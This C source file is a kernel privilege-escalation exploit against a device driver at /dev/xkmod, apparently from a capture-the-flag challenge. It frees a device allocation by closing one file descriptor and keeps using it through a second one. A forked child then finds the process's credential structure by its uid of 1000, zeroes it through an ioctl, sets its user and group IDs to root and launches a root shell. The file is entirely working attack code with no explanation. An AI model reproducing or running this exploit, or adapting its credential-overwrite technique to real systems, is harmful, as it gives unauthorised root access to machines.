#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

struct Data {
    size_t *ptr;
    unsigned int offset;
    unsigned int length;
} data;

void func_alloc(int dev_fd)
{
    ioctl(dev_fd, 0x1111111);
}

void func_edit(int dev_fd, struct Data *data)
{
    ioctl(dev_fd, 0x6666666, data);
}

void func_get(int dev_fd, struct Data *data)
{
    ioctl(dev_fd, 0x7777777, data);
}

int main(int argc, char **argv, char *envp)
{
    int dev_fd[2];

    for (int i = 0; i < 2; i++) {
        dev_fd[i] = open("/dev/xkmod", O_RDONLY);
    }

    puts("[*] Start exploiting...");

    data.ptr = malloc(0x100);
    data.offset = 0;
    data.length = 0x50;

    func_alloc(dev_fd[0]);
    close(dev_fd[0]);
    
    int pid = fork();
    if (!pid) { /* child process to get root */
        func_get(dev_fd[1], &data);

        /* hit the cred */
        if (((int*)(data.ptr))[3] == 1000) {
            for (int i = 0; i < 10; i++) {
                data.ptr[i] = 0;
            }
            func_edit(dev_fd[1], &data);
            if (!getuid()) {
                puts("[+] Get root.");
                setresuid(0, 0, 0);
                setresgid(0, 0, 0);
                system("/bin/sh");
                exit(EXIT_SUCCESS);
            }
        } else {
            puts("[x] Failed!");
            exit(EXIT_FAILURE);
        }
    }

    wait(NULL);
    puts("[+] done.");

    return 0;
}